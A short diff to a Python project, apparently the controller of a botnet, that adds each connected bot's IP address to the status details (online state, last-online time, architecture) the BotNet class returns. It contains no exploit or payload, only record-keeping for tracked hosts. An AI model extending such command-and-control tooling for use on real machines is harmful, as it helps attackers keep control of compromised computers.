@@ -101,20 +101,20 @@ class BotNet(Thread):
             if spec:
                 if spec in self.onlineConnections:
                     bot = self.onlineConnections[spec]
-                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                 elif spec in self.offlineConnections:
                     bot = self.offlineConnections[spec]
-                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                 else:
                     return {}
             else:
                 dets = {}
                 for username in self.onlineConnections.keys():
                     bot = self.onlineConnections[username]
-                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                 for username in self.offlineConnections.keys():
                     bot = self.offlineConnections[username]
-                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch)
+                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                 return dets
 
     def run(self):
@@ -322,6 +322,7 @@ class Bot:
         self.sock = formatsock.FormatSocket(sock)
         self.user = host_info['user']
         self.arch = host_info['arch']
+        self.ip = host_info['ip']
 
         self.socketio = socketio
         self.lastonline = lastonline
